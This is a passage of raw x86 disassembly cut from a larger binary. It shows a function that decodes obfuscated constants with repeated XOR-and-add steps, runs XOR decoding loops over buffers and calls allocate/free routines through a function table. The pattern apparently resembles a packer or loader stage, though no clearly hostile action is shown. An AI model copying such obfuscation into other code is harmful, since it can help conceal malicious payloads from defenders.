  424f66:	jbe    0x424dcb
  424f6c:	mov    esi,edi
  424f6e:	mov    eax,DWORD PTR [ebp-0x38]
  424f71:	mov    ecx,DWORD PTR [ebp-0x1c]
  424f74:	cmp    ecx,eax
  424f76:	jne    0x424f89
  424f78:	push   DWORD PTR [ebp+0x8]
  424f7b:	lea    eax,[ebp-0x40]
  424f7e:	push   eax
  424f7f:	call   0x427ad0
  424f84:	mov    DWORD PTR [ebp-0x24],eax
  424f87:	jmp    0x424f95
  424f89:	mov    eax,DWORD PTR [ebp-0x24]
  424f8c:	mov    ecx,DWORD PTR [ebp-0x18]
  424f8f:	xor    ecx,ebx
  424f91:	add    ecx,esi
  424f93:	xor    DWORD PTR [eax],ecx
  424f95:	mov    eax,DWORD PTR [ebp-0x10]
  424f98:	mov    ecx,DWORD PTR [ebp-0x24]
  424f9b:	xor    eax,ebx
  424f9d:	add    eax,esi
  424f9f:	cmp    eax,ecx
  424fa1:	je     0x425719
  424fa7:	mov    eax,DWORD PTR [ebp-0x10]
  424faa:	mov    ecx,DWORD PTR [ebp-0x40]
  424fad:	xor    eax,ebx
  424faf:	add    eax,esi
  424fb1:	cmp    eax,ecx
  424fb3:	je     0x425719
  424fb9:	mov    eax,DWORD PTR [ebp-0x10]
  424fbc:	xor    eax,ebx
  424fbe:	add    eax,esi
  424fc0:	jmp    0x424fde
  424fc2:	mov    edi,DWORD PTR [ebp-0x24]
  424fc5:	mov    cl,al
  424fc7:	and    cl,0x1f
  424fca:	or     dl,0xff
  424fcd:	sub    dl,cl
  424fcf:	add    BYTE PTR [edi+eax*1],dl
  424fd2:	mov    ecx,DWORD PTR [ebp-0x18]
  424fd5:	xor    ecx,ebx
  424fd7:	lea    eax,[eax+ecx*1+0x3272f8]
  424fde:	mov    ecx,DWORD PTR [ebp-0x40]
  424fe1:	cmp    eax,ecx
  424fe3:	jb     0x424fc2
  424fe5:	mov    eax,DWORD PTR [ebp-0x40]
  424fe8:	mov    DWORD PTR [ebp-0x28],eax
  424feb:	mov    eax,DWORD PTR [ebp-0x24]
  424fee:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  424ff5:	mov    DWORD PTR [ebp-0xd4],eax
  424ffb:	mov    edi,0xf89c85b8
  425000:	mov    DWORD PTR [ebp-0x2c],edi
  425003:	mov    eax,DWORD PTR [ebp-0x38]
  425006:	xor    eax,ebx
  425008:	add    eax,esi
  42500a:	mov    DWORD PTR [ebp-0xc],eax
  42500d:	mov    eax,DWORD PTR [ebp-0x38]
  425010:	xor    eax,ebx
  425012:	add    eax,esi
  425014:	mov    DWORD PTR [ebp-0x8],eax
  425017:	mov    DWORD PTR [ebp-0x48],0xf89c8599
  42501e:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  425025:	mov    eax,DWORD PTR [ebp-0x38]
  425028:	mov    ecx,DWORD PTR [ebp-0x28]
  42502b:	xor    eax,ebx
  42502d:	add    eax,esi
  42502f:	cmp    ecx,eax
  425031:	je     0x425230
  425037:	jmp    0x42520c
  42503c:	mov    ecx,DWORD PTR [ebp-0xc]
  42503f:	mov    eax,DWORD PTR [ebp-0x28]
  425042:	sub    eax,ecx
  425044:	mov    ecx,DWORD PTR [ebp-0x48]
  425047:	xor    ecx,ebx
  425049:	add    ecx,esi
  42504b:	xor    edx,edx
  42504d:	div    ecx
  42504f:	mov    DWORD PTR [ebp-0x8],eax
  425052:	mov    eax,DWORD PTR [ebp-0x4c]
  425055:	mov    ecx,DWORD PTR [ebp-0x8]
  425058:	xor    eax,ebx
  42505a:	add    eax,esi
  42505c:	cmp    ecx,eax
  42505e:	jbe    0x42506a
  425060:	mov    eax,DWORD PTR [ebp-0x4c]
  425063:	xor    eax,ebx
  425065:	add    eax,esi
  425067:	mov    DWORD PTR [ebp-0x8],eax
  42506a:	mov    eax,DWORD PTR [ebp-0x48]
  42506d:	mov    ecx,DWORD PTR [ebp-0x8]
  425070:	xor    eax,ebx
  425072:	add    eax,esi
  425074:	imul   eax,ecx
  425077:	mov    DWORD PTR [ebp-0x8],eax
  42507a:	mov    eax,DWORD PTR [ebp-0x38]
  42507d:	mov    ecx,DWORD PTR [ebp-0x8]
  425080:	xor    eax,ebx
  425082:	add    eax,esi
  425084:	cmp    ecx,eax
  425086:	je     0x4251fa
  42508c:	mov    eax,DWORD PTR [ebp-0x8]
  42508f:	mov    DWORD PTR [ebp-0x14],eax
  425092:	mov    eax,DWORD PTR [ebp-0xc]
  425095:	add    eax,DWORD PTR [ebp-0xd4]
  42509b:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  4250a2:	mov    DWORD PTR [ebp-0x34],edi
  4250a5:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  4250af:	mov    DWORD PTR [ebp-0x8],eax
  4250b2:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  4250b9:	mov    DWORD PTR [ebp-0x1c],edi
  4250bc:	mov    eax,DWORD PTR [ebp-0x20]
  4250bf:	xor    eax,ebx
  4250c1:	add    eax,esi
  4250c3:	jmp    0x4251b9
  4250c8:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  4250d2:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  4250dc:	mov    eax,DWORD PTR [ebp-0x1c]
  4250df:	mov    ecx,DWORD PTR [ebp-0x44]
  4250e2:	xor    eax,ebx
  4250e4:	add    eax,esi
  4250e6:	imul   eax,ecx
  4250e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4250ec:	mov    al,BYTE PTR [eax+ecx*1]
  4250ef:	mov    BYTE PTR [ebp-0x2],al
  4250f2:	mov    eax,DWORD PTR [ebp-0x1c]
  4250f5:	mov    ecx,DWORD PTR [ebp-0x44]
  4250f8:	xor    eax,ebx
  4250fa:	add    eax,esi
  4250fc:	imul   eax,ecx
  4250ff:	mov    ecx,DWORD PTR [ebp-0xe8]
  425105:	xor    ecx,ebx
  425107:	add    eax,ecx
  425109:	mov    ecx,DWORD PTR [ebp-0x8]
  42510c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f8]
  425114:	mov    ecx,DWORD PTR [ebp-0xe0]
  42511a:	xor    ecx,ebx
  42511c:	lea    eax,[ecx+eax*1+0x3272f8]
  425123:	movzx  ecx,BYTE PTR [ebp-0x2]
  425127:	xor    ecx,eax
  425129:	mov    BYTE PTR [ebp-0x2],cl
  42512c:	mov    al,BYTE PTR [ebp-0x2]
  42512f:	mov    ecx,DWORD PTR [ebp-0x1c]
  425132:	mov    edx,DWORD PTR [ebp-0x44]
  425135:	xor    ecx,ebx
  425137:	add    ecx,esi
  425139:	imul   ecx,edx
  42513c:	mov    edx,DWORD PTR [ebp-0x8]
  42513f:	mov    BYTE PTR [ecx+edx*1],al
  425142:	mov    eax,DWORD PTR [ebp-0x1c]
  425145:	mov    ecx,DWORD PTR [ebp-0x44]
  425148:	xor    eax,ebx
  42514a:	add    eax,esi
  42514c:	imul   eax,ecx
  42514f:	mov    ecx,DWORD PTR [ebp-0x8]
  425152:	mov    al,BYTE PTR [eax+ecx*1]
  425155:	mov    BYTE PTR [ebp-0x2],al
  425158:	mov    eax,DWORD PTR [ebp-0x1c]
  42515b:	mov    ecx,DWORD PTR [ebp-0x44]
  42515e:	xor    eax,ebx
  425160:	add    eax,esi
  425162:	imul   eax,ecx
  425165:	mov    ecx,DWORD PTR [ebp-0x34]
  425168:	xor    ecx,ebx
  42516a:	add    eax,ecx
  42516c:	mov    ecx,DWORD PTR [ebp-0x8]
  42516f:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f8]
  425177:	mov    ecx,DWORD PTR [ebp-0xc4]
  42517d:	xor    ecx,ebx
  42517f:	lea    eax,[ecx+eax*1+0x3272f8]
  425186:	movzx  ecx,BYTE PTR [ebp-0x2]
  42518a:	xor    ecx,eax
  42518c:	mov    BYTE PTR [ebp-0x2],cl
  42518f:	mov    al,BYTE PTR [ebp-0x2]
  425192:	mov    ecx,DWORD PTR [ebp-0x1c]
  425195:	mov    edx,DWORD PTR [ebp-0x44]
  425198:	xor    ecx,ebx
  42519a:	add    ecx,esi
  42519c:	imul   ecx,edx
  42519f:	mov    edx,DWORD PTR [ebp-0x8]
  4251a2:	mov    BYTE PTR [ecx+edx*1],al
  4251a5:	mov    eax,DWORD PTR [ebp-0x30]
  4251a8:	mov    ecx,DWORD PTR [ebp-0x34]
  4251ab:	xor    eax,ebx
  4251ad:	xor    ecx,ebx
  4251af:	add    eax,esi
  4251b1:	add    ecx,esi
  4251b3:	imul   eax,ecx
  4251b6:	add    eax,DWORD PTR [ebp-0x44]
  4251b9:	mov    DWORD PTR [ebp-0x44],eax
  4251bc:	mov    eax,DWORD PTR [ebp-0x44]
  4251bf:	mov    ecx,DWORD PTR [ebp-0x14]
  4251c2:	cmp    ecx,eax
  4251c4:	jb     0x4250c8
  4251ca:	mov    eax,DWORD PTR [ebp-0x34]
  4251cd:	mov    ecx,DWORD PTR [ebp-0x14]
  4251d0:	xor    eax,ebx
  4251d2:	add    eax,esi
  4251d4:	imul   eax,ecx
  4251d7:	mov    ecx,DWORD PTR [ebp-0x20]
  4251da:	xor    ecx,ebx
  4251dc:	add    ecx,esi
  4251de:	or     eax,ecx
  4251e0:	mov    ecx,DWORD PTR [ebp-0x2c]
  4251e3:	xor    ecx,ebx
  4251e5:	add    eax,ecx
  4251e7:	mov    ecx,DWORD PTR [ebp-0x2c]
  4251ea:	xor    ecx,ebx
  4251ec:	add    eax,ecx
  4251ee:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f1:	lea    eax,[eax+ecx*1+0x64e5f0]
  4251f8:	jmp    0x425209
  4251fa:	mov    eax,DWORD PTR [ebp-0x2c]
  4251fd:	mov    ecx,DWORD PTR [ebp-0xc]
  425200:	xor    eax,ebx
  425202:	lea    eax,[eax+ecx*1+0x3272f8]
  425209:	mov    DWORD PTR [ebp-0xc],eax
  42520c:	mov    eax,DWORD PTR [ebp-0x2c]
  42520f:	xor    eax,ebx
  425211:	mov    ecx,0xffcd8d08
  425216:	sub    ecx,eax
  425218:	add    ecx,DWORD PTR [ebp-0x28]
  42521b:	mov    eax,DWORD PTR [ebp-0x2c]
  42521e:	mov    edx,DWORD PTR [ebp-0xc]
  425221:	xor    eax,ebx
  425223:	add    eax,esi
  425225:	imul   eax,edx
  425228:	cmp    eax,ecx
  42522a:	jbe    0x42503c
  425230:	mov    eax,DWORD PTR [ebp-0x10]
  425233:	mov    ecx,DWORD PTR [ebp-0x40]
  425236:	mov    eax,DWORD PTR [ebp+0x8]
  425239:	mov    edx,DWORD PTR [ebp-0x54]
  42523c:	mov    eax,DWORD PTR [eax+0x1e0]
  425242:	xor    edx,ebx
  425244:	add    edx,esi
  425246:	push   edx
  425247:	mov    edx,DWORD PTR [ebp-0x3c]
  42524a:	xor    edx,ebx
  42524c:	add    edx,esi
  42524e:	push   edx
  42524f:	push   ecx
  425250:	mov    DWORD PTR [ebp-0x30],ecx
  425253:	mov    ecx,DWORD PTR [ebp-0x10]
  425256:	xor    ecx,ebx
  425258:	add    ecx,esi
  42525a:	push   ecx
  42525b:	call   DWORD PTR [eax+0x14]
  42525e:	mov    edi,eax
  425260:	mov    eax,DWORD PTR [ebp-0x10]
  425263:	xor    eax,ebx
  425265:	add    eax,esi
  425267:	cmp    eax,edi
  425269:	je     0x4252c4
  42526b:	mov    eax,DWORD PTR [ebp-0x10]
  42526e:	jmp    0x425291
  425270:	mov    ecx,DWORD PTR [ebp-0x24]
  425273:	xor    eax,ebx
  425275:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f8]
  42527c:	mov    BYTE PTR [eax+edi*1+0x3272f8],cl
  425283:	mov    ecx,DWORD PTR [ebp-0x18]
  425286:	xor    ecx,ebx
  425288:	lea    eax,[ecx+eax*1+0x3272f8]
  42528f:	xor    eax,ebx
  425291:	mov    ecx,DWORD PTR [ebp-0x40]
  425294:	sub    ecx,esi
  425296:	xor    ecx,ebx
  425298:	cmp    eax,ecx
  42529a:	jne    0x425270
  42529c:	mov    eax,DWORD PTR [ebp+0x8]
  42529f:	mov    ecx,DWORD PTR [ebp-0x50]
  4252a2:	mov    eax,DWORD PTR [eax+0x1e0]
  4252a8:	xor    ecx,ebx
  4252aa:	add    ecx,esi
  4252ac:	push   ecx
  4252ad:	mov    ecx,DWORD PTR [ebp-0x10]
  4252b0:	xor    ecx,ebx
  4252b2:	add    ecx,esi
  4252b4:	push   ecx
  4252b5:	push   DWORD PTR [ebp-0x24]
  4252b8:	call   DWORD PTR [eax+0x18]
  4252bb:	mov    eax,DWORD PTR [ebp-0x30]
  4252be:	mov    DWORD PTR [ebp-0x24],edi
  4252c1:	mov    DWORD PTR [ebp-0x40],eax
  4252c4:	mov    edi,DWORD PTR [ebp-0x24]
  4252c7:	mov    eax,DWORD PTR [ebp-0x18]
  4252ca:	mov    ecx,DWORD PTR [ebp-0x10]
  4252cd:	xor    eax,ebx
  4252cf:	mov    DWORD PTR [ebp-0x30],edi
  4252d2:	add    eax,esi
  4252d4:	mov    DWORD PTR [ebp-0x5c],0xbcd3cbd3
  4252db:	mov    DWORD PTR [ebp-0x58],0xc6d3bed3
  4252e2:	jmp    0x425316
  4252e4:	xor    ecx,ebx
  4252e6:	mov    dl,BYTE PTR [ebp+ecx*1+0x32729c]
  4252ed:	xor    dl,0x80
  4252f0:	add    dl,0x5
  4252f3:	mov    DWORD PTR [ebp-0x3c],ecx
  4252f6:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f8]
  4252fe:	movzx  edx,dl
  425301:	cmp    ecx,edx
  425303:	jne    0x425320
  425305:	mov    ecx,DWORD PTR [ebp-0x18]
  425308:	mov    edx,DWORD PTR [ebp-0x3c]
  42530b:	xor    ecx,ebx
  42530d:	lea    ecx,[ecx+edx*1+0x3272f8]
  425314:	xor    ecx,ebx
  425316:	cmp    ecx,0xf89c85a1
  42531c:	jne    0x4252e4
  42531e:	jmp    0x425327
  425320:	mov    eax,DWORD PTR [ebp-0x10]
  425323:	xor    eax,ebx
  425325:	add    eax,esi
  425327:	mov    ecx,DWORD PTR [ebp-0x10]
  42532a:	xor    ecx,ebx
  42532c:	add    ecx,esi
  42532e:	cmp    ecx,eax
  425330:	je     0x4254a3
  425336:	mov    eax,DWORD PTR [edi+0x8]
  425339:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  425340:	mov    DWORD PTR [ebp-0x3c],0xf89cc3c6
  425347:	mov    DWORD PTR [ebp-0x48],0xf89cb5b9
  42534e:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  425355:	mov    DWORD PTR [ebp-0x14],eax
  425358:	mov    eax,DWORD PTR [ebp+0x8]
  42535b:	mov    ecx,DWORD PTR [ebp-0x20]
  42535e:	xor    ecx,ebx
  425360:	add    ecx,esi
  425362:	push   ecx
  425363:	mov    ecx,DWORD PTR [ebp-0x48]
  425366:	mov    eax,DWORD PTR [eax+0x1e0]
  42536c:	xor    ecx,ebx
  42536e:	add    ecx,esi
  425370:	push   ecx
  425371:	mov    ecx,DWORD PTR [ebp-0x3c]
  425374:	xor    ecx,ebx
  425376:	add    ecx,esi
  425378:	push   ecx
  425379:	mov    ecx,DWORD PTR [ebp-0xc]
  42537c:	xor    ecx,ebx
  42537e:	add    ecx,esi
  425380:	push   ecx
  425381:	call   DWORD PTR [eax+0x14]
  425384:	mov    edi,eax
  425386:	mov    eax,DWORD PTR [ebp+0x8]
  425389:	mov    ecx,DWORD PTR [ebp-0x20]
  42538c:	mov    eax,DWORD PTR [eax+0x1e0]
  425392:	xor    ecx,ebx
  425394:	add    ecx,esi
  425396:	push   ecx
  425397:	mov    ecx,DWORD PTR [ebp-0x48]
  42539a:	xor    ecx,ebx
  42539c:	add    ecx,esi
  42539e:	push   ecx
  42539f:	mov    ecx,DWORD PTR [ebp-0xc]
  4253a2:	push   DWORD PTR [ebp-0x14]
  4253a5:	xor    ecx,ebx
  4253a7:	add    ecx,esi
  4253a9:	push   ecx
  4253aa:	call   DWORD PTR [eax+0x14]
  4253ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4253b0:	xor    ecx,ebx
  4253b2:	add    ecx,esi
  4253b4:	mov    DWORD PTR [ebp-0x20],eax
  4253b7:	cmp    ecx,edi
  4253b9:	je     0x425746
  4253bf:	mov    ecx,DWORD PTR [ebp-0xc]
  4253c2:	xor    ecx,ebx
  4253c4:	add    ecx,esi
  4253c6:	cmp    ecx,eax
  4253c8:	je     0x425746
  4253ce:	mov    DWORD PTR [ebp-0x3c],0xf89c85ba
  4253d5:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  4253dc:	mov    ecx,DWORD PTR [ebp-0x3c]
  4253df:	xor    cl,0xb1
  4253e2:	sub    cl,0x8
  4253e5:	mov    BYTE PTR [edi],cl
  4253e7:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ea:	xor    cl,0xb1
  4253ed:	sub    cl,0x8
  4253f0:	mov    BYTE PTR [edi+0x1],cl
  4253f3:	mov    ecx,DWORD PTR [ebp-0x54]
  4253f6:	xor    cl,0xb1
  4253f9:	sub    cl,0x8
  4253fc:	mov    BYTE PTR [edi+0x2],cl
  4253ff:	and    DWORD PTR [ebp-0xc8],0x0
  425406:	and    DWORD PTR [ebp-0xdc],0x0
  42540d:	lea    ecx,[ebp-0xdc]
  425413:	push   ecx
  425414:	push   DWORD PTR [ebp-0x14]
  425417:	push   eax
  425418:	lea    eax,[ebp-0xc8]
  42541e:	push   eax
  42541f:	mov    eax,DWORD PTR [ebp-0x30]
  425422:	push   DWORD PTR [eax+0xc]
  425425:	mov    eax,DWORD PTR [ebp-0x24]
  425428:	add    eax,0x10
  42542b:	push   eax
  42542c:	push   edi
  42542d:	call   0x4246d3
  425432:	mov    DWORD PTR [ebp-0x3c],eax
  425435:	mov    eax,DWORD PTR [ebp+0x8]
  425438:	mov    ecx,DWORD PTR [ebp-0x50]
  42543b:	mov    eax,DWORD PTR [eax+0x1e0]
  425441:	xor    ecx,ebx
  425443:	add    ecx,esi
  425445:	push   ecx
  425446:	mov    ecx,DWORD PTR [ebp-0xc]
  425449:	xor    ecx,ebx
  42544b:	add    ecx,esi
  42544d:	push   ecx
  42544e:	push   edi
  42544f:	call   DWORD PTR [eax+0x18]
  425452:	mov    eax,DWORD PTR [ebp-0x3c]
  425455:	add    eax,0xffcd8d08
  42545a:	xor    eax,ebx
  42545c:	cmp    eax,0xf89c85b9
  425461:	mov    eax,DWORD PTR [ebp+0x8]
  425464:	mov    eax,DWORD PTR [eax+0x1e0]
  42546a:	mov    ecx,DWORD PTR [ebp-0x50]
  42546d:	jne    0x425490
  42546f:	xor    ecx,ebx
  425471:	add    ecx,esi
  425473:	push   ecx
  425474:	mov    ecx,DWORD PTR [ebp-0xc]
  425477:	xor    ecx,ebx
  425479:	add    ecx,esi
  42547b:	push   ecx
  42547c:	push   DWORD PTR [ebp-0x24]
  42547f:	call   DWORD PTR [eax+0x18]
  425482:	mov    eax,DWORD PTR [ebp-0x20]
  425485:	mov    DWORD PTR [ebp-0x24],eax
  425488:	mov    eax,DWORD PTR [ebp-0x14]
  42548b:	mov    DWORD PTR [ebp-0x40],eax
  42548e:	jmp    0x4254a3
  425490:	xor    ecx,ebx
  425492:	add    ecx,esi
  425494:	push   ecx
  425495:	mov    ecx,DWORD PTR [ebp-0xc]
  425498:	xor    ecx,ebx
  42549a:	add    ecx,esi
  42549c:	push   ecx
  42549d:	push   DWORD PTR [ebp-0x20]
  4254a0:	call   DWORD PTR [eax+0x18]
  4254a3:	mov    eax,DWORD PTR [ebp-0x40]
  4254a6:	mov    DWORD PTR [ebp-0x38],eax
  4254a9:	mov    eax,DWORD PTR [ebp-0x24]
  4254ac:	mov    DWORD PTR [ebp-0x28],0xf89c85b9
  4254b3:	mov    DWORD PTR [ebp-0x3c],eax
  4254b6:	mov    edi,0xf89c85b8
  4254bb:	mov    DWORD PTR [ebp-0x2c],edi
  4254be:	mov    eax,DWORD PTR [ebp-0x28]
  4254c1:	xor    eax,ebx
  4254c3:	add    eax,esi
  4254c5:	mov    DWORD PTR [ebp-0xc],eax
  4254c8:	mov    eax,DWORD PTR [ebp-0x28]
  4254cb:	xor    eax,ebx
  4254cd:	add    eax,esi
  4254cf:	mov    DWORD PTR [ebp-0x14],eax
  4254d2:	mov    DWORD PTR [ebp-0x48],0xf89c8599
  4254d9:	mov    DWORD PTR [ebp-0x20],0xf89c85be
  4254e0:	mov    eax,DWORD PTR [ebp-0x28]
  4254e3:	mov    ecx,DWORD PTR [ebp-0x38]
  4254e6:	xor    eax,ebx
  4254e8:	add    eax,esi
  4254ea:	cmp    ecx,eax
  4254ec:	je     0x4256e2
  4254f2:	jmp    0x4256be
  4254f7:	mov    ecx,DWORD PTR [ebp-0xc]
  4254fa:	mov    eax,DWORD PTR [ebp-0x38]
  4254fd:	sub    eax,ecx
  4254ff:	mov    ecx,DWORD PTR [ebp-0x48]
  425502:	xor    ecx,ebx
  425504:	add    ecx,esi
  425506:	xor    edx,edx
  425508:	div    ecx
  42550a:	mov    DWORD PTR [ebp-0x14],eax
  42550d:	mov    eax,DWORD PTR [ebp-0x20]
  425510:	mov    ecx,DWORD PTR [ebp-0x14]
  425513:	xor    eax,ebx
  425515:	add    eax,esi
  425517:	cmp    ecx,eax
  425519:	jbe    0x425525
  42551b:	mov    eax,DWORD PTR [ebp-0x20]
  42551e:	xor    eax,ebx
  425520:	add    eax,esi
  425522:	mov    DWORD PTR [ebp-0x14],eax
  425525:	mov    eax,DWORD PTR [ebp-0x48]
  425528:	mov    ecx,DWORD PTR [ebp-0x14]
  42552b:	xor    eax,ebx
  42552d:	add    eax,esi
  42552f:	imul   eax,ecx
  425532:	mov    DWORD PTR [ebp-0x14],eax
  425535:	mov    eax,DWORD PTR [ebp-0x28]
  425538:	mov    ecx,DWORD PTR [ebp-0x14]
  42553b:	xor    eax,ebx
  42553d:	add    eax,esi
  42553f:	cmp    ecx,eax
  425541:	je     0x4256ac
  425547:	mov    eax,DWORD PTR [ebp-0x14]
  42554a:	mov    DWORD PTR [ebp-0x34],eax
  42554d:	mov    eax,DWORD PTR [ebp-0xc]
  425550:	add    eax,DWORD PTR [ebp-0x3c]
  425553:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  42555a:	mov    DWORD PTR [ebp-0x14],edi
  42555d:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  425564:	mov    DWORD PTR [ebp-0x1c],eax
  425567:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  42556e:	mov    DWORD PTR [ebp-0x8],edi
  425571:	mov    eax,DWORD PTR [ebp-0x4c]
  425574:	xor    eax,ebx
  425576:	add    eax,esi
  425578:	jmp    0x42566b
  42557d:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  425587:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  425591:	mov    eax,DWORD PTR [ebp-0x8]
  425594:	mov    ecx,DWORD PTR [ebp-0x18]
  425597:	xor    eax,ebx
  425599:	add    eax,esi
  42559b:	imul   eax,ecx
  42559e:	mov    ecx,DWORD PTR [ebp-0x1c]
  4255a1:	mov    al,BYTE PTR [eax+ecx*1]
  4255a4:	mov    BYTE PTR [ebp-0x1],al
  4255a7:	mov    eax,DWORD PTR [ebp-0x8]
  4255aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4255ad:	xor    eax,ebx
  4255af:	add    eax,esi
  4255b1:	imul   eax,ecx
  4255b4:	mov    ecx,DWORD PTR [ebp-0x54]
  4255b7:	xor    ecx,ebx
  4255b9:	add    eax,ecx
  4255bb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4255be:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f8]
  4255c6:	mov    ecx,DWORD PTR [ebp-0xe4]
  4255cc:	xor    ecx,ebx
  4255ce:	lea    eax,[ecx+eax*1+0x3272f8]
  4255d5:	movzx  ecx,BYTE PTR [ebp-0x1]
  4255d9:	xor    ecx,eax
  4255db:	mov    BYTE PTR [ebp-0x1],cl
  4255de:	mov    al,BYTE PTR [ebp-0x1]
  4255e1:	mov    ecx,DWORD PTR [ebp-0x8]
  4255e4:	mov    edx,DWORD PTR [ebp-0x18]
  4255e7:	xor    ecx,ebx
  4255e9:	add    ecx,esi
  4255eb:	imul   ecx,edx
  4255ee:	mov    edx,DWORD PTR [ebp-0x1c]
  4255f1:	mov    BYTE PTR [ecx+edx*1],al
  4255f4:	mov    eax,DWORD PTR [ebp-0x8]
  4255f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4255fa:	xor    eax,ebx
  4255fc:	add    eax,esi
  4255fe:	imul   eax,ecx
  425601:	mov    ecx,DWORD PTR [ebp-0x1c]
  425604:	mov    al,BYTE PTR [eax+ecx*1]
  425607:	mov    BYTE PTR [ebp-0x1],al
  42560a:	mov    eax,DWORD PTR [ebp-0x8]
  42560d:	mov    ecx,DWORD PTR [ebp-0x18]
  425610:	xor    eax,ebx
  425612:	add    eax,esi
  425614:	imul   eax,ecx
  425617:	mov    ecx,DWORD PTR [ebp-0x14]
  42561a:	xor    ecx,ebx
  42561c:	add    eax,ecx
  42561e:	mov    ecx,DWORD PTR [ebp-0x1c]
  425621:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f8]
  425629:	mov    ecx,DWORD PTR [ebp-0xd0]
  42562f:	xor    ecx,ebx
  425631:	lea    eax,[ecx+eax*1+0x3272f8]
  425638:	movzx  ecx,BYTE PTR [ebp-0x1]
  42563c:	xor    ecx,eax
  42563e:	mov    BYTE PTR [ebp-0x1],cl
  425641:	mov    al,BYTE PTR [ebp-0x1]
  425644:	mov    ecx,DWORD PTR [ebp-0x8]
  425647:	mov    edx,DWORD PTR [ebp-0x18]
  42564a:	xor    ecx,ebx
  42564c:	add    ecx,esi
  42564e:	imul   ecx,edx
  425651:	mov    edx,DWORD PTR [ebp-0x1c]
  425654:	mov    BYTE PTR [ecx+edx*1],al
  425657:	mov    eax,DWORD PTR [ebp-0x30]
  42565a:	mov    ecx,DWORD PTR [ebp-0x14]
  42565d:	xor    eax,ebx
  42565f:	xor    ecx,ebx
  425661:	add    eax,esi
  425663:	add    ecx,esi
  425665:	imul   eax,ecx
  425668:	add    eax,DWORD PTR [ebp-0x18]
  42566b:	mov    DWORD PTR [ebp-0x18],eax
  42566e:	mov    eax,DWORD PTR [ebp-0x18]
  425671:	mov    ecx,DWORD PTR [ebp-0x34]
  425674:	cmp    ecx,eax
  425676:	jb     0x42557d
  42567c:	mov    eax,DWORD PTR [ebp-0x14]
  42567f:	mov    ecx,DWORD PTR [ebp-0x34]
  425682:	xor    eax,ebx
  425684:	add    eax,esi
  425686:	imul   eax,ecx
  425689:	mov    ecx,DWORD PTR [ebp-0x4c]
  42568c:	xor    ecx,ebx
  42568e:	add    ecx,esi
  425690:	or     eax,ecx
  425692:	mov    ecx,DWORD PTR [ebp-0x2c]
  425695:	xor    ecx,ebx
  425697:	add    eax,ecx
  425699:	mov    ecx,DWORD PTR [ebp-0x2c]
  42569c:	xor    ecx,ebx
  42569e:	add    eax,ecx
  4256a0:	mov    ecx,DWORD PTR [ebp-0xc]
  4256a3:	lea    eax,[eax+ecx*1+0x64e5f0]
  4256aa:	jmp    0x4256bb
  4256ac:	mov    eax,DWORD PTR [ebp-0x2c]
  4256af:	mov    ecx,DWORD PTR [ebp-0xc]
  4256b2:	xor    eax,ebx
  4256b4:	lea    eax,[eax+ecx*1+0x3272f8]
  4256bb:	mov    DWORD PTR [ebp-0xc],eax
  4256be:	mov    eax,DWORD PTR [ebp-0x2c]
  4256c1:	xor    eax,ebx
  4256c3:	mov    ecx,0xffcd8d08
  4256c8:	sub    ecx,eax
  4256ca:	add    ecx,DWORD PTR [ebp-0x38]
  4256cd:	mov    eax,DWORD PTR [ebp-0x2c]
  4256d0:	mov    edx,DWORD PTR [ebp-0xc]
  4256d3:	xor    eax,ebx
  4256d5:	add    eax,esi
  4256d7:	imul   eax,edx
  4256da:	cmp    eax,ecx
  4256dc:	jbe    0x4254f7
  4256e2:	push   DWORD PTR [ebp+0x8]
  4256e5:	mov    eax,DWORD PTR [ebp+0x8]
  4256e8:	push   DWORD PTR [eax+0x1cc]
  4256ee:	lea    eax,[ebp-0xd8]
  4256f4:	push   eax
  4256f5:	mov    eax,DWORD PTR [ebp+0x8]
  4256f8:	mov    eax,DWORD PTR [eax+0x1c4]
  4256fe:	push   DWORD PTR [eax]
  425700:	mov    eax,DWORD PTR [ebp+0x8]
  425703:	mov    eax,DWORD PTR [eax+0x1c0]
  425709:	push   DWORD PTR [eax]
  42570b:	push   DWORD PTR [ebp-0x40]
  42570e:	push   DWORD PTR [ebp-0x24]
  425711:	call   0x4261a8
  425716:	mov    DWORD PTR [ebp-0x3c],eax
  425719:	mov    eax,DWORD PTR [ebp-0x10]
  42571c:	mov    ecx,DWORD PTR [ebp-0x24]
  42571f:	xor    eax,ebx
  425721:	add    eax,esi
  425723:	cmp    eax,ecx
  425725:	je     0x425746
  425727:	mov    eax,DWORD PTR [ebp+0x8]
  42572a:	mov    ecx,DWORD PTR [ebp-0x50]
  42572d:	mov    eax,DWORD PTR [eax+0x1e0]
  425733:	xor    ecx,ebx
  425735:	add    ecx,esi
  425737:	push   ecx
  425738:	mov    ecx,DWORD PTR [ebp-0x10]
  42573b:	xor    ecx,ebx
  42573d:	add    ecx,esi
  42573f:	push   ecx
  425740:	push   DWORD PTR [ebp-0x24]
  425743:	call   DWORD PTR [eax+0x18]
  425746:	pop    edi
  425747:	pop    esi
  425748:	pop    ebx
  425749:	leave  
  42574a:	ret    0x4
  42574d:	push   ebp
  42574e:	mov    ebp,esp
  425750:	push   ecx
  425751:	push   ecx
  425752:	lea    eax,[ebp-0x8]
